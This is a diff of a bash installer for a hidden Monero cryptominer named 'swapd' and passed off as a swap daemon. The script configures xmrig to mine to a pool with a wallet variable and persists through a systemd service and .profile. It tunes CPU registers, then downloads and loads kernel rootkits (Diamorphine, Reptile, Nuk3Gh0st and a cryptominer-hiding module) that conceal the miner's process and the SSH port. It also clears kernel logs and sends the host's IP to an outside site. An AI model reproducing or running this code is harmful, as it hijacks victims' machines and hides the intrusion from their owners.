-sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' "$HOME"/.swapd/config.json
-
-echo "[*] Copying xmrig-proxy config"
-
-#mv "$HOME"/.swapd/config.json "$HOME"/.swapd/config_ORiG.json
-
-#cd "$HOME"/.swapd/ ; touch config.json ; cat config.json <<EOL
-#{
-#    "autosave": true,
-#    "cpu": true,
-#    "opencl": true,
-#    "cuda": true,
-#    "pools": [
-#        {
-#            "url": "194.164.63.118:3333"
-#        }
-#    ]
-#}
-#EOL
+echo "[*] #creating $HOME/.swapd/config.json config..."
+cat >"$HOME"/.swapd/config.json <<EOL
+{
+    "autosave": true,
+    "donate-level": 0,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": false,
+        "hw-aes": null,
+        "priority": null,
+        "memory-pool": false,
+        "yield": true,
+        "asm": true,
+        "argon2-impl": null,
+        "astrobwt-max-size": 550,
+        "astrobwt-avx2": false,
+        "cn/0": false,
+        "cn-lite/0": false,
+        "kawpow": false
+    },
+    "opencl": false,
+    "cuda": false,
+    "log-file": null,
+    "pools": [
+        {
+            "coin": null,
+            "algo": "rx/0",
+            "url": "gulf.moneroocean.stream:20128",
+            "user": "$WALLET",
+            "pass": "x",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": true,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        }
+    ],
+    "retries": 5,
+    "retry-pause": 5,
+    "print-time": 60,
+    "health-print-time": 60,
+    "dmi": true,
+    "syslog": false,
+    "tls": {
+        "enabled": false,
+        "protocols": null,
+        "cert": null,
+        "cert_key": null,
+        "ciphers": null,
+        "ciphersuites": null,
+        "dhparam": null
+    },
+    "dns": {
+        "ipv6": false,
+        "ttl": 30
+    },
+    "user-agent": null,
+    "verbose": 0,
+    "watch": true,
+    "pause-on-battery": false,
+    "pause-on-active": false
+}
+EOL
 
 cp "$HOME"/.swapd/config.json "$HOME"/.swapd/config_background.json
-sed -i 's/"background": *false,/"background": true,/' "$HOME"/.swapd/config_background.json
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' "$HOME"/.swapd/config_background.json
 
-#echo "[*] #preparing script..."
-
-killall xmrig
-
-echo "[*] Creating "$HOME"/.swapd/swapd.sh script"
-cat >"$HOME"/.swapd/swapd.sh <<EOL
+echo "[*] #creating $HOME/.swapd/swapd.sh script..."
+cat >"$HOME"/.swapd/swapd.sh <<'EOL'
 #!/bin/bash
-if ! pidof swapd >/dev/null; then
-  nice "$HOME"/.swapd/swapd \$*
-else
-  echo "Monero miner is already running in the background. Refusing to run another one."
-  echo "Run \"killall swapd\" or \"sudo killall swapd\" if you want to remove background miner first."
-fi
+cd $HOME/.swapd
+./swapd --config=config.json
 EOL
-
 chmod +x "$HOME"/.swapd/swapd.sh
 
-echo "[*] #preparing script background work and work under reboot..."
-
-if ! sudo -n true 2>/dev/null; then
-  if ! grep .swapd/swapd.sh "$HOME"/.profile >/dev/null; then
-    echo "[*] Adding "$HOME"/.swapd/swapd.sh script to "$HOME"/.profile"
-    echo ""$HOME"/.swapd/swapd.sh --config="$HOME"/.swapd/config.json >/dev/null 2>&1" >>"$HOME"/.profile
-  else
-    echo "Looks like "$HOME"/.swapd/swapd.sh script is already in the "$HOME"/.profile"
-  fi
-  echo "[*] Running miner in the background (see logs in "$HOME"/.swapd/swapd.log file)"
-  bash "$HOME"/.swapd/swapd.sh --config="$HOME"/.swapd/config_background.json >/dev/null 2>&1
-else
-
-  if [ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]; then
-    echo "[*] Enabling huge pages"
-    echo "vm.nr_hugepages=$((1168 + $(nproc)))" | sudo tee -a /etc/sysctl.conf
-    sudo sysctl -w vm.nr_hugepages=$((1168 + $(nproc)))
-  fi
-
-  if ! type systemctl >/dev/null; then
-
-    echo "[*] Running miner in the background (see logs in "$HOME"/.swapd/swapd.log file)"
-    bash "$HOME"/.swapd/swapd.sh --config="$HOME"/.swapd/config_background.json >/dev/null 2>&1
-    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
-    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
-
-  else
-
-    echo "[*] Creating moneroocean systemd service"
-
-    rm -rf /etc/systemd/system/swapd.service
-
-    cat >/tmp/swapd.service <<EOL
-[Unit]
-Description=Swap Daemon Service
-
-[Service]
-ExecStart="$HOME"/.swapd/swapd --config=/root/.swapd/config.json
-Restart=always
-Nice=10
-CPUWeight=1
-
-[Install]
-WantedBy=multi-user.target
-EOL
-    sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
-    #sudo chmod 666 /etc/systemd/system/swapd.service
-    echo "[*] Starting swapd systemd service"
-    sudo killall swapd 2>/dev/null
-    sudo systemctl daemon-reload
-    sudo systemctl enable swapd.service
-#    sudo systemctl start swapd.service
-    echo "To see swapd service logs run \"sudo journalctl -u swapd -f\" command"
-  fi
-fi
-
-echo ""
-echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
-if [ "$CPU_THREADS" -lt "4" ]; then
-  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
-  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
-  echo "sudo cpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b"
-  if [ "$(tail -n1 /etc/rc.local)" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
-  else
-    echo "sudo sed -i -e '\$i \\cpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
-  fi
-else
-  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \"$HOME"/.swapd/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \"$HOME"/.swapd/config_background.json"
-fi
-echo ""
-
-echo "[*] #Installing r00tkit(z)"
-#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r) git make gcc -y --force-yes ; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-
-echo "[*] Determining GPU+CPU (without lshw)"
-yum install pciutils -y
-apt-get install pciutils -y --force-yes
-update-pciids
-lspci -vs 00:01.0
-nvidia-smi
-aticonfig --odgc --odgt
-nvtop
-radeontop
-echo "Possible CPU Threads:"
-(nproc)
-#cd "$HOME"/.swapd/ ; wget https://github.com/pwnfoo/xmrig-cuda-linux-binary/raw/main/libxmrig-cuda.so
-
-echo "[*] Determining GPU+CPU"
-yum install msr-tools pciutils lshw -y
-apt-get install msr-tools pciutils lshw -y --force-yes
-zypper install msrtools pciutils lshw -y
-update-pciids
-lspci -vs 00:01.0
-lshw -C display
-nvidia-smi
-aticonfig --odgc --odgt
-nvtop
-radeontop
-echo "Possible CPU Threads:"
-(nproc)
-
-#echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; apt-get update -y ; apt-get install linux-headers-$(uname -r) git make gcc msr-tools -y --force-yes ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-
-#echo "[*] Nuk3Gh0st..."
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ;rm -rf Nuk3Gh0st ; rm -rf /usr/bin/nuk3gh0st/ ; zypper update ; zypper install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; zypper update -y; zypper install -y ncurses-devel ; git clone https://github.com/juanschallibaum/Nuk3Gh0st ; cd Nuk3Gh0st ; make ; make install ; load-nuk3gh0st ; nuk3gh0st --hide-pid=`/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-
-#echo "[*] Reptile..."
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ; apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y --force-yes ; yum update -y; yum install -y ncurses-devel ; git clone https://gitee.com/fengzihk/Reptile.git && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-
-apt install dwarves -y
-cp /sys/kernel/btf/vmlinux /usr/lib/modules/$(uname -r)/build/
-
-optimize_func() {
-  MSR_FILE=/sys/module/msr/parameters/allow_writes
-
-  if test -e "$MSR_FILE"; then
-    echo on >$MSR_FILE
-  else
-    modprobe msr allow_writes=on
-  fi
-
-  if grep -E 'AMD Ryzen|AMD EPYC' /proc/cpuinfo >/dev/null; then
-    if grep "cpu family[[:space:]]\{1,\}:[[:space:]]25" /proc/cpuinfo >/dev/null; then
-      if grep "model[[:space:]]\{1,\}:[[:space:]]97" /proc/cpuinfo >/dev/null; then
-        echo "Detected Zen4 CPU"
-        wrmsr -a 0xc0011020 0x4400000000000
-        wrmsr -a 0xc0011021 0x4000000000040
-        wrmsr -a 0xc0011022 0x8680000401570000
-        wrmsr -a 0xc001102b 0x2040cc10
-        echo "MSR register values for Zen4 applied"
-      else
-        echo "Detected Zen3 CPU"
-        wrmsr -a 0xc0011020 0x4480000000000
-        wrmsr -a 0xc0011021 0x1c000200000040
-        wrmsr -a 0xc0011022 0xc000000401500000
-        wrmsr -a 0xc001102b 0x2000cc14
-        echo "MSR register values for Zen3 applied"
-      fi
-    else
-      echo "Detected Zen1/Zen2 CPU"
-      wrmsr -a 0xc0011020 0
-      wrmsr -a 0xc0011021 0x40
-      wrmsr -a 0xc0011022 0x1510000
-      wrmsr -a 0xc001102b 0x2000cc16
-      echo "MSR register values for Zen1/Zen2 applied"
-    fi
-  elif grep "Intel" /proc/cpuinfo >/dev/null; then
-    echo "Detected Intel CPU"
-    wrmsr -a 0x1a4 0xf
-    echo "MSR register values for Intel applied"
-  else
-    echo "No supported CPU detected"
-  fi
-
-  sysctl -w vm.nr_hugepages=$(nproc)
-
-  for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d); do
-    echo 3 >"$i/hugepages/hugepages-1048576kB/nr_hugepages"
+echo "[*] #running performance tunings..."
+sudo -n true 2>/dev/null
+if [ $? -eq 0 ]; then
+  echo "Applying system optimizations..."
+  
+  sudo sysctl -w vm.nr_hugepages=$(nproc)
+  
+  for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d 2>/dev/null); do
+    echo 3 | sudo tee "$i/hugepages/hugepages-1048576kB/nr_hugepages" 2>/dev/null
   done
-
-  echo "1GB pages successfully enabled"
-}
-
-if [ "$(id -u)" = 0 ]; then
-  echo "Running as root"
-  optimize_func
+  
+  # MSR optimization (if msr-tools available)
+  if type rdmsr 2>/dev/null && type wrmsr 2>/dev/null; then
+    for i in $(seq 0 $(($(nproc)-1))); do
+      sudo wrmsr -p${i} 0x1a4 0xf 2>/dev/null
+    done
+    echo "MSR register 0x1a4 set to 0xf"
+  fi
+  
+  echo "1GB pages enabled successfully"
 else
-  echo "Not running as root"
-  sysctl -w vm.nr_hugepages=$(nproc)
+  echo "Running without root - limited optimizations"
+  sudo sysctl -w vm.nr_hugepages=$(nproc) 2>/dev/null
 fi
-
-echo "[*] hid1ng... ;)"
-
-kill -31 $(pgrep -f -u root config.json)
-
-kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
-#kill -31 `/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
-
-kill -63 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}') :
-#kill -63 `/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
-
-# echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
-
-rm -rf "$HOME"/xmrig*
-rm -rf xmrig*
-apt autoremove -y
-yum autoremove -y
-
-rm -rf "$HOME"/xmrig* "$HOME"/config.json* "$HOME"/config*
-
-#cat << 'EOF' > ""$HOME"/.swapd/check_swapd.sh"
-#    #!/bin/bash
-#
-#    # Define the service name
-#    SERVICE="swapd"
-#
-#    # Check if the service is running
-#    if systemctl is-active --quiet $SERVICE
-#    then
-#        echo "$SERVICE is running."
-#    else
-#        echo "$SERVICE is not running. Attempting to restart..."
-#        systemctl restart $SERVICE
-#
-#        # Check if the restart was successful
-#        if systemctl is-active --quiet $SERVICE
-#        then
-#            echo "$SERVICE has been successfully restarted."
-#        else
-#            echo "Failed to restart $SERVICE."
-#        fi
-#    fi
-#EOF
-
-## Make the check script executable
-#chmod +x ""$HOME"/.swapd/check_swapd.sh"
-
-## Cron job setup: remove outdated lines and add the new command
-#CRON_JOB="*/5 * * * * "$HOME"/.swapd/check_swapd.sh"
-#(crontab -l 2>/dev/null | grep -v -E '(out dat|check_swapd.sh)'; echo "$CRON_JOB") | crontab -
 
 echo "PASS..."
 #PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
@@ -704,139 +1018,146 @@ fi
 echo "[*] Done! Kernel headers for $(uname -r) are installed."
 
 echo "[*] make toolZ, Diamorphine"
-cd /tmp
-cd .ICE-unix
-cd .X11-unix
+mkdir -p /tmp/.ICE-unix/.X11-unix 2>/dev/null
+cd /tmp/.ICE-unix/.X11-unix || cd /tmp
 rm -rf Diamorphine
 rm -rf Reptile
-yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y
-apt-get update -y
-NEEDRESTART_MODE=a apt-get reinstall kmod
-NEEDRESTART_MODE=a apt-get install linux-generic linux-headers-$(uname -r) -y
-NEEDRESTART_MODE=a apt-get install git make gcc msr-tools build-essential libncurses-dev -y
-sudo NEEDRESTART_MODE=a apt install -t bookworm-backports linux-image-amd64 -y
-sudo NEEDRESTART_MODE=a apt install -t bookworm-backports linux-headers-amd64 -y
-zypper update -y
-zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools build-essential libncurses-dev -y
-git clone https://github.com/m0nad/Diamorphine
-cd Diamorphine/
-make
-insmod diamorphine.ko
-dmesg -C
-kill -63 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
+yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y 2>/dev/null
+apt-get update -y 2>/dev/null
+NEEDRESTART_MODE=a apt-get reinstall kmod 2>/dev/null
+NEEDRESTART_MODE=a apt-get install linux-generic linux-headers-$(uname -r) -y 2>/dev/null
+NEEDRESTART_MODE=a apt-get install git make gcc msr-tools build-essential libncurses-dev -y 2>/dev/null
+sudo NEEDRESTART_MODE=a apt install -t bookworm-backports linux-image-amd64 -y 2>/dev/null
+sudo NEEDRESTART_MODE=a apt install -t bookworm-backports linux-headers-amd64 -y 2>/dev/null
+zypper update -y 2>/dev/null
+zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools build-essential libncurses-dev -y 2>/dev/null
+git clone https://github.com/m0nad/Diamorphine 2>/dev/null
+cd Diamorphine/ 2>/dev/null || exit 0
+make 2>/dev/null
+insmod diamorphine.ko 2>/dev/null
+dmesg -C 2>/dev/null
+kill -63 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null
 
 # Create emergency swap to prevent OOM killer
-sudo dd if=/dev/zero of=/swapfile bs=1G count=2
-sudo chmod 600 /swapfile
-sudo mkswap /swapfile
-sudo swapon /swapfile
-echo "vm.swappiness=100" | sudo tee -a /etc/sysctl.conf
-sudo sysctl -p
+sudo dd if=/dev/zero of=/swapfile bs=1G count=2 2>/dev/null
+sudo chmod 600 /swapfile 2>/dev/null
+sudo mkswap /swapfile 2>/dev/null
+sudo swapon /swapfile 2>/dev/null
+echo "vm.swappiness=100" | sudo tee -a /etc/sysctl.conf 2>/dev/null
+sudo sysctl -p 2>/dev/null
 
 # ====== SAFE REPTILE INSTALL ======
 # Keep this BEFORE any Reptile installation commands
 CURRENT_SSH_PID=$$  # Capture current SSH session PID
-CURRENT_SSH_PORT=$(ss -tnp | awk -v pid=$CURRENT_SSH_PID '/:22/ && $0 ~ pid {split($4,a,":"); print a[2]}')
+CURRENT_SSH_PORT=$(ss -tnp 2>/dev/null | awk -v pid=$CURRENT_SSH_PID '/:22/ && $0 ~ pid {split($4,a,":"); print a[2]}')
 
 # Schedule connection watchdog
 (
     sleep 30
     if ! ping -c1 1.1.1.1 &>/dev/null; then
         echo "Connection lost - triggering reboot"
-        /reptile/reptile_cmd unhide_all
+        /reptile/reptile_cmd unhide_all 2>/dev/null
         reboot
     fi
 ) &
 
 echo "[*] Reptile..."
-cd /tmp
-cd .ICE-unix
-cd .X11-unix
+cd /tmp/.ICE-unix/.X11-unix 2>/dev/null || cd /tmp
 rm -rf Diamorphine
 rm -rf Reptile
-NEEDRESTART_MODE=a apt-get update -y
-yum update -y
-yum install -y ncurses-devel
-git clone https://gitee.com/fengzihk/Reptile.git --depth 1 || {
+NEEDRESTART_MODE=a apt-get update -y 2>/dev/null
+yum update -y 2>/dev/null
+yum install -y ncurses-devel 2>/dev/null
+git clone https://gitee.com/fengzihk/Reptile.git --depth 1 2>/dev/null || {
     echo "[!] Git failed, using direct download";
-    curl -L https://github.com/f0rb1dd3n/Reptile/archive/refs/heads/master.zip -o reptile.zip && \
-    unzip reptile.zip && \
-    mv Reptile-master Reptile
+    curl -L https://github.com/f0rb1dd3n/Reptile/archive/refs/heads/master.zip -o reptile.zip 2>/dev/null && \
+    unzip reptile.zip 2>/dev/null && \
+    mv Reptile-master Reptile 2>/dev/null
 }
 
-cd Reptile
+cd Reptile 2>/dev/null || exit 0
 
 # Apply critical kernel version patch
-sed -i 's/REPTILE_ALLOW_VERSIONS =.*/REPTILE_ALLOW_VERSIONS = "3.10.0-1160"/' config.mk
+sed -i 's/REPTILE_ALLOW_VERSIONS =.*/REPTILE_ALLOW_VERSIONS = "3.10.0-1160"/' config.mk 2>/dev/null
 
 # Build with memory limits
-ulimit -v 1048576  # Limit to 1GB virtual memory
+ulimit -v 1048576 2>/dev/null # Limit to 1GB virtual memory
 
 # For compilation steps
-make defconfig
-make -j$(nproc)
+make defconfig 2>/dev/null
+make -j$(nproc) 2>/dev/null
 
 if [ $? -ne 0 ]; then
     echo "[!] Main compilation failed, trying legacy mode"
-    make clean
-    make CC=gcc-4.8  # Force older compiler
+    make clean 2>/dev/null
+    make CC=gcc-4.8 2>/dev/null # Force older compiler
 fi
 
-[ -f output/reptile.ko ] && sudo insmod output/reptile.ko || echo "[!] Compilation ultimately failed"
+[ -f output/reptile.ko ] && sudo insmod output/reptile.ko 2>/dev/null || echo "[!] Compilation ultimately failed"
 
-kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
+kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null
 
 # Replace existing SSH handling with:
 SSHD_PIDS=$(pgrep -f "sshd:.*@")
 for pid in $SSHD_PIDS; do
-    echo 0 > /proc/$pid/oom_score_adj
+    echo 0 > /proc/$pid/oom_score_adj 2>/dev/null
     /reptile/reptile_cmd show_pid $pid 2>/dev/null
-    /reptile/reptile_cmd show_file /proc/$pid/cmdline
+    /reptile/reptile_cmd show_file /proc/$pid/cmdline 2>/dev/null
 done
 
 # Whitelist current SSH session
-CURRENT_SSH_PORT=$(sudo netstat -tnep | awk '/sshd/ && $NF~/'"$$"'/ {split($4,a,":");print a[2]}')
-sudo /reptile/reptile_cmd show_port $CURRENT_SSH_PORT
+CURRENT_SSH_PORT=$(sudo netstat -tnep 2>/dev/null | awk '/sshd/ && $NF~/'"$$"'/ {split($4,a,":");print a[2]}')
+sudo /reptile/reptile_cmd show_port $CURRENT_SSH_PORT 2>/dev/null
 
 # ====== ENABLE ROOTKIT FEATURES SAFELY ======
 # Activate Reptile but exclude critical components
-/reptile/reptile_cmd hide  # Enable basic hiding
-/reptile/reptile_cmd hide_port 22  # Hide SSH port from NEW connections
-/reptile/reptile_cmd hide_pid 1  # Hide init but preserve current session
+/reptile/reptile_cmd hide 2>/dev/null # Enable basic hiding
+/reptile/reptile_cmd hide_port 22 2>/dev/null # Hide SSH port from NEW connections
+/reptile/reptile_cmd hide_pid 1 2>/dev/null # Hide init but preserve current session
 
 # Replace with IPv4-only check:
 SSH_TEST_IP=$(curl -4 -s ifconfig.co)
-curl -4 -s "http://ssh-check.com/api/verify?ip=${SSH_TEST_IP}" || true
-
-# ====== SAFE EXECUTION ======
-if install_reptile; then
-    # Reptile-specific commands
-    /reptile/reptile_cmd hide
-else
-    # Fallback cleanup
-    rmmod reptile 2>/dev/null
-fi
+curl -4 -s "http://ssh-check.com/api/verify?ip=${SSH_TEST_IP}" 2>/dev/null || true
 
 
 echo "[*] hide crypto miner."
-cd /tmp
-cd .X11-unix
-git clone https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git && cd hiding-cryptominers-linux-rootkit/ && make
-dmesg -C && insmod rootkit.ko && dmesg
-kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
-rm -rf hiding-cryptominers-linux-rootkit/
+cd /tmp/.X11-unix 2>/dev/null || cd /tmp
+git clone https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git 2>/dev/null && cd hiding-cryptominers-linux-rootkit/ && make 2>/dev/null
+dmesg -C 2>/dev/null && insmod rootkit.ko 2>/dev/null && dmesg 2>/dev/null
+kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null
+rm -rf hiding-cryptominers-linux-rootkit/ 2>/dev/null
 
+echo "[*] #setting up swapd systemd service..."
+
+cat >/tmp/swapd.service <<EOL
+[Unit]
+Description=Swap Daemon Service
+
+[Service]
+ExecStart=$HOME/.swapd/swapd --config=$HOME/.swapd/config.json
+Restart=always
+Nice=10
+CPUWeight=1
+
+[Install]
+WantedBy=multi-user.target
+EOL
+sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
+sudo systemctl daemon-reload
+sudo systemctl enable swapd.service
+sudo systemctl start swapd.service
+echo "Configured systemd service and will run it in background."
 
 systemctl status swapd
 systemctl start swapd
 systemctl status swapd
 
-kill -31 $(pgrep -f -u root config.json) &
-kill -31 $(pgrep -f -u root config_background.json) &
-kill -31 `/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'` &
-kill -31 `/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` &
-kill -63 `/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'` &
-kill -63 `/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` &
+kill -31 $(pgrep -f -u root config.json) 2>/dev/null &
+kill -31 $(pgrep -f -u root config_background.json) 2>/dev/null &
+kill -31 $(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
+kill -31 $(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
+kill -63 $(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
+kill -63 $(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
 
 # New addition: Delete xmrig files in login directory
 log_message "Cleaning up xmrig files in login directory..."
